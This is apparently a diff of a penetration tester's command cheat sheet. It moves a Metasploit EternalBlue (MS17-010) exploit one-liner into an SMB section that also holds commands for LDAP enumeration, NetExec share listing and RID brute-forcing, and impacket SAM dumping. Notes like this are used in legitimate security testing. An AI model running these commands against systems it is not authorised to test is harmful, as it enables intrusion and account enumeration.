@@ -40,9 +40,6 @@ cat *1000*.nmap
 cat *ALL*.nmap
 find . -name '*.nmap' -readable -exec echo {} \; -exec cat {} \;
 
-## metasploit
-msfconsole -x -q 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; run'
-
 ## hosts
 echo "$TARGET $DOM $DC" | sudo tee -a /etc/hosts
 
@@ -123,6 +120,7 @@ ldapsearch -H ldap://$DC/ -D "$DOM\$USERNAME" -w '$PASSWORD' -b "" -s base "(obj
 ldapsearch -H ldap://$DC/ -D "$DOM\$USERNAME" -w '$PASSWORD' -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" "*" | grep 'SAM' -B 4 -A 3
 
 [*] (445) SMB
+msfconsole -x -q 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; run'
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))'
 impacket-samrdump "$TARGET"
